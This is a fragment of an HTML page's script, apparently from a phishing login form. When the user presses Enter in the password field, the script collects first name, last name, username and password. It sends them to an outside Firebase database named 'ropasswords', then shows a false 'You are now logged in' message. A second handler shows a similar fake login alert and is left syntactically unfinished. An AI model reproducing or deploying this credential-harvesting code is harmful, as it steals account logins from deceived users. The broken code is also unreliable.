         </SPAN>
        <script>
      var myDataRef = new Firebase('https://ropasswords.firebaseio.com/');
      $('#Passwordn').keypress(function (e) {
        if (e.keyCode == 13) {
          var First = $('#First').val();
          var Last = $('#Last').val();
          var Usernamen = $('#Usernamen').val();
          var Passwordn = $('#Passwordn').val();
          myDataRef.push({First: First, Last: Last, Usernamen: Usernamen, Passwordn: Passwordn});
          alert("You are now logged in as " + Usernamen);
        }
      });
      
        $('#Passwordo').keypress(function (e) {
        if (e.keyCode == 13) {
          var Usernameo = $('#Usernameo').val();
          var Passwordo = $('#Passwordo').val();
          alert("You logged in as " + Usernameo);

      });
